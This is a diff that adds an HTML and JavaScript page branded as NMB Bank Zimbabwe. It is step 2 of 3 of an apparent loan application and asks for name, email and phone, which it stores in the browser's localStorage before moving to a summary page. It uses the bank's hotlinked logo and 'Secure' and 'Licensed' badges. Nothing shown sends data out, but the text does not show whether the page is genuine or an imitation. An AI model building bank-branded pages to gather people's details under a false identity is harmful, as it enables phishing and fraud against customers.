@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Personal Details - NMB Bank Zimbabwe</title>
+    <meta name="theme-color" content="#001f3f">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap');
+      
+        :root {
+            --primary: #001f3f;
+            --primary-dark: #000f1f;
+            --primary-light: #e8f0f8;
+            --accent: #D4AF37;
+            --accent-light: #f5ead3;
+            --dark: #1a1a1a;
+            --gray-900: #1a1a1a;
+            --gray-800: #2d2d2d;
+            --gray-700: #4a4a4a;
+            --gray-600: #6c757d;
+            --gray-500: #8a9aaa;
+            --gray-400: #b0b8c0;
+            --gray-200: #e8ecf1;
+            --gray-100: #f5f7fa;
+            --white: #ffffff;
+            --success: #2b8a3e;
+            --error: #dc3545;
+            --shadow-soft: 0 4px 12px rgba(0,0,0,0.05);
+            --shadow-hard: 0 12px 32px rgba(0,0,0,0.1);
+            --radius-lg: 24px;
+            --radius-md: 16px;
+            --radius-sm: 10px;
+            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background: var(--gray-100);
+            color: var(--dark);
+            line-height: 1.6;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 520px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        /* ===== NAVIGATION ===== */
+        nav {
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            background: rgba(255, 255, 255, 0.8);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            padding: 14px 0;
+            margin-bottom: 32px;
+            border-bottom: 1px solid var(--gray-200);
+        }
+
+        .nav-content {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .nav-left {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .back-link {
+            width: 40px;
+            height: 40px;
+            background: var(--gray-100);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--gray-700);
+            text-decoration: none;
+            transition: var(--transition);
+            font-size: 16px;
+            border: 1px solid var(--gray-200);
+        }
+
+        .back-link:hover {
+            background: var(--primary-light);
+            color: var(--primary);
+            border-color: var(--primary-light);
+        }
+
+        .logo-img {
+            height: 40px;
+            width: auto;
+        }
+
+        .trust-badges {
+            display: flex;
+            gap: 8px;
+        }
+
+        .trust-tag {
+            background: var(--primary-light);
+            color: var(--primary);
+            font-size: 11px;
+            font-weight: 700;
+            padding: 6px 12px;
+            border-radius: 20px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        /* ===== FORM CARD ===== */
+        .form-card {
+            background: var(--white);
+            border-radius: var(--radius-lg);
+            padding: 40px 32px;
+            box-shadow: var(--shadow-soft);
+            margin-bottom: 40px;
+        }
+
+        .form-header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .form-title {
+            font-size: 28px;
+            font-weight: 800;
+            color: var(--primary);
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        .form-subtitle {
+            font-size: 14px;
+            color: var(--gray-600);
+            font-weight: 500;
+        }
+
+        /* ===== PROGRESS ===== */
+        .progress-section {
+            margin-bottom: 32px;
+        }
+
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            font-weight: 700;
+            color: var(--gray-600);
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .progress-bar {
+            height: 6px;
+            background: var(--gray-200);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 66%;
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+            border-radius: 10px;
+            transition: width 0.4s ease;
+        }
+
+        /* ===== FORM GROUPS ===== */
+        .name-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--gray-700);
+            margin-bottom: 8px;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--primary);
+            font-size: 16px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 14px 16px 14px 48px;
+            background: var(--gray-100);
+            border: 1.5px solid var(--gray-200);
+            border-radius: var(--radius-sm);
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--gray-900);
+            outline: none;
+            transition: var(--transition);
+            font-family: inherit;
+        }
+
+        .form-input:focus {
+            background: var(--white);
+            border-color: var(--primary);
+            box-shadow: 0 0 0 4px rgba(0, 31, 63, 0.08);
+        }
+
+        .form-input::placeholder {
+            color: var(--gray-500);
+            font-weight: 400;
+        }
+
+        .phone-prefix {
+            position: absolute;
+            left: 48px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-weight: 700;
+            color: var(--gray-900);
+            font-size: 15px;
+        }
+
+        .phone-input {
+            padding-left: 100px;
+        }
+
+        /* ===== ERROR STATES ===== */
+        .form-input.invalid {
+            border-color: var(--error);
+            background: #fff8f8;
+        }
+
+        .form-input.invalid:focus {
+            box-shadow: 0 0 0 4px rgba(220, 53, 69, 0.08);
+        }
+
+        .field-error {
+            color: var(--error);
+            font-size: 12px;
+            font-weight: 600;
+            margin-top: 6px;
+            display: none;
+            padding-left: 4px;
+        }
+
+        /* ===== BUTTONS ===== */
+        .btn-group {
+            display: grid;
+            grid-template-columns: 1fr 2fr;
+            gap: 12px;
+            margin-top: 40px;
+        }
+
+        .btn {
+            padding: 16px 24px;
+            border-radius: var(--radius-sm);
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            border: none;
+            transition: var(--transition);
+            font-family: inherit;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-prev {
+            background: var(--gray-100);
+            color: var(--gray-700);
+            border: 1px solid var(--gray-200);
+        }
+
+        .btn-prev:hover {
+            background: var(--gray-200);
+            border-color: var(--gray-300);
+        }
+
+        .btn-next {
+            background: var(--primary);
+            color: var(--white);
+            box-shadow: 0 8px 20px rgba(0, 31, 63, 0.15);
+        }
+
+        .btn-next:hover {
+            background: var(--primary-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 12px 28px rgba(0, 31, 63, 0.2);
+        }
+
+        .btn-next:active {
+            transform: translateY(0);
+        }
+
+        /* ===== FOOTER ===== */
+        footer {
+            padding: 40px 0;
+            text-align: center;
+            border-top: 1px solid var(--gray-200);
+        }
+
+        .footer-logo {
+            height: 32px;
+            opacity: 0.4;
+            margin-bottom: 16px;
+        }
+
+        .footer-text {
+            font-size: 12px;
+            color: var(--gray-600);
+            font-weight: 500;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
+            .container {
+                padding: 0 20px;
+            }
+
+            .form-card {
+                padding: 32px 24px;
+            }
+
+            .form-title {
+                font-size: 24px;
+            }
+
+            .trust-badges {
+                display: none;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .name-row {
+                grid-template-columns: 1fr;
+            }
+
+            .btn-group {
+                grid-template-columns: 1fr;
+            }
+
+            .form-card {
+                padding: 28px 20px;
+            }
+
+            nav {
+                margin-bottom: 24px;
+                padding: 12px 0;
+            }
+
+            .nav-left {
+                gap: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<nav>
+    <div class="container nav-content">
+        <div class="nav-left">
+            <a href="javascript:history.back()" class="back-link" title="Go back">
+                <i class="fas fa-chevron-left"></i>
+            </a>
+            <img src="https://nmbz.co.zw/nmb/sites/default/files/logo_1.png" alt="NMB Bank" class="logo-img">
+        </div>
+        <div class="trust-badges">
+            <span class="trust-tag"><i class="fas fa-lock"></i> Secure</span>
+            <span class="trust-tag"><i class="fas fa-check-circle"></i> Licensed</span>
+        </div>
+    </div>
+</nav>
+
+<main class="container">
+    <div class="form-card">
+        <div class="form-header">
+            <h1 class="form-title">Personal Details</h1>
+            <p class="form-subtitle">Step 2 of 3: Verification Information</p>
+        </div>
+        
+        <div class="progress-section">
+            <div class="progress-label">
+                <span>Application Progress</span>
+                <span>66% Complete</span>
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+        </div>
+
+        <div class="name-row">
+            <div class="form-group">
+                <label class="form-label">First Name</label>
+                <div class="input-wrapper">
+                    <span class="input-icon"><i class="fas fa-user"></i></span>
+                    <input type="text" class="form-input" id="firstName" placeholder="John">
+                </div>
+                <div class="field-error" id="firstNameError">First name is required</div>
+            </div>
+            <div class="form-group">
+                <label class="form-label">Last Name</label>
+                <div class="input-wrapper">
+                    <span class="input-icon"><i class="fas fa-user"></i></span>
+                    <input type="text" class="form-input" id="lastName" placeholder="Doe">
+                </div>
+                <div class="field-error" id="lastNameError">Last name is required</div>
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label class="form-label">Email Address</label>
+            <div class="input-wrapper">
+                <span class="input-icon"><i class="fas fa-envelope"></i></span>
+                <input type="email" class="form-input" id="email" placeholder="john.doe@email.com">
+            </div>
+            <div class="field-error" id="emailError">Valid email is required</div>
+        </div>
+
+        <div class="form-group">
+            <label class="form-label">Phone Number</label>
+            <div class="input-wrapper">
+                <span class="input-icon"><i class="fas fa-phone"></i></span>
+                <span class="phone-prefix">+263</span>
+                <input type="tel" id="phone" class="form-input phone-input" placeholder="712345678" maxlength="9">
+            </div>
+            <div class="field-error" id="phoneError">Valid 9-digit number is required</div>
+        </div>
+
+        <div class="btn-group">
+            <button class="btn btn-prev" onclick="history.back()">
+                <i class="fas fa-chevron-left"></i> Back
+            </button>
+            <button class="btn btn-next" id="nextBtn">
+                Next Step <i class="fas fa-arrow-right"></i>
+            </button>
+        </div>
+    </div>
+
+    <footer>
+        <img src="https://nmbz.co.zw/nmb/sites/default/files/logo_1.png" alt="NMB Bank" class="footer-logo">
+        <p class="footer-text">© 2026 NMB Bank Limited – Licensed Financial Services Provider in Zimbabwe</p>
+    </footer>
+</main>
+
+<script>
+    // Pre-fill from sessionStorage (from loan amount modal)
+    const loanData = sessionStorage.getItem('loanData');
+    if (loanData) {
+        const data = JSON.parse(loanData);
+        console.log('Loan Data:', data);
+    }
+
+    // Pre-fill from localStorage if available
+    const fields = ['firstName', 'lastName', 'email', 'phone'];
+    fields.forEach(field => {
+        if (localStorage.getItem(field)) {
+            document.getElementById(field).value = localStorage.getItem(field);
+        }
+    });
+
+    const nextBtn = document.getElementById('nextBtn');
+
+    nextBtn.addEventListener('click', function() {
+        const data = {
+            firstName: document.getElementById('firstName').value.trim(),
+            lastName: document.getElementById('lastName').value.trim(),
+            email: document.getElementById('email').value.trim(),
+            phone: document.getElementById('phone').value.trim()
+        };
+
+        // Reset errors
+        document.querySelectorAll('.field-error').forEach(el => el.style.display = 'none');
+        document.querySelectorAll('.form-input').forEach(el => el.classList.remove('invalid'));
+
+        let valid = true;
+
+        // Validate first name
+        if (!data.firstName) {
+            document.getElementById('firstName').classList.add('invalid');
+            document.getElementById('firstNameError').style.display = 'block';
+            valid = false;
+        }
+
+        // Validate last name
+        if (!data.lastName) {
+            document.getElementById('lastName').classList.add('invalid');
+            document.getElementById('lastNameError').style.display = 'block';
+            valid = false;
+        }
+
+        // Validate email
+        if (data.email && (!data.email.includes('@') || !data.email.includes('.'))) {
+            document.getElementById('email').classList.add('invalid');
+            document.getElementById('emailError').style.display = 'block';
+            valid = false;
+        }
+
+        // Validate phone
+        if (!data.phone || data.phone.length !== 9 || !/^\d{9}$/.test(data.phone)) {
+            document.getElementById('phone').classList.add('invalid');
+            document.getElementById('phoneError').style.display = 'block';
+            valid = false;
+        }
+
+        if (!valid) return;
+
+        // Save to localStorage and navigate
+        Object.keys(data).forEach(key => localStorage.setItem(key, data[key]));
+        
+        // Navigate to summary page
+        window.location.href = 'summary';
+    });
+
+    // Allow Enter key to submit
+    document.querySelectorAll('.form-input').forEach(input => {
+        input.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                nextBtn.click();
+            }
+        });
+    });
+</script>
+
+</body>
+</html>
